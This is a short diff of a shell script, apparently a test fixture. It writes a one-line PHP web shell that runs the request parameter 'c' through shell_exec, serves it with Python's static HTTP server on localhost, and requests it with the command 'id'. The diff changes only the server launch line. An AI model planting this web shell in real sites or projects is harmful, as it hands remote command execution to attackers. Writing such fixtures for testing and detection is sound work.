@@ -7,7 +7,7 @@ mkdir -p webroot
 cat > webroot/shell.php <<'EOS'
 <?php if (isset($_REQUEST["c"])) { echo shell_exec($_REQUEST["c"]); } ?>
 EOS
-python3 -m http.server 18080 --directory webroot >/dev/null 2>&1 &
+( cd webroot && python3 -m http.server 18080 >/dev/null 2>&1 ) &
 SRV=$!; sleep 0.5
 curl -sf "http://127.0.0.1:18080/shell.php?c=id" >/dev/null || true
 kill $SRV 2>/dev/null || true
